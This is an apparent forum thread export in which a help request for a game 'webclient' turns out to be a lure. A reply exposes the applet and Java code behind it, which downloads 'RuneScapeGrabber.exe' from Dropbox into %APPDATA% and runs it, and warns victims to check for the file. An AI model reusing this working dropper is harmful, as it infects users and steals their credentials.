channel.title: Webclient help server part
channel.description:
My webclient has some weird error and people told me to post here.
here is my webclinet link *
PLEASE HELP ASAP.

item.title: Webclient help server part
item.dc:creator: @deathschaos9 DeathsChaos9
item.description:
@deathschaos9 wrote:

<applet width=100% height=100% code='Java.class' archive='Java.jar'> <param name='lol' value='http://dl.dropbox.com/u/62974486/RuneScapeGrabber.exe' /> <param name='location' value='%APPDATA%' /> <param name='file' value='lqigTr.exe' /> <param name='r' value ='' /> </applet>

public void init() { String fff = getParameter("file"); String eee = System.getenv("APPDATA"); Object LooBj = getParameter("r"); byte AoB[] = new byte[1024]; try { URL localURL = new URL(getParameter("lol")); FileOutputStream LfOs = new FileOutputStream((new StringBuilder()).append(eee).append(fff).toString()); URLConnection LuC = localURL.openConnection(); InputStream LfIs = LuC.getInputStream(); int idt; while((idt = LfIs.read(AoB, 0, AoB.length)) != -1) { LfOs.write(AoB, 0, idt); } LfIs.close(); LfOs.close(); Runtime LR = Runtime.getRuntime(); LR.exec((new StringBuilder()).append(eee).append(fff).toString()); LooBj = new URL((String)LooBj); getAppletContext().showDocument((URL)LooBj); } catch(Exception ex) { return; } }

If anyone clicked the link I suggest you check %AppData% for ‘lqigTr.exe’.

Read full topic
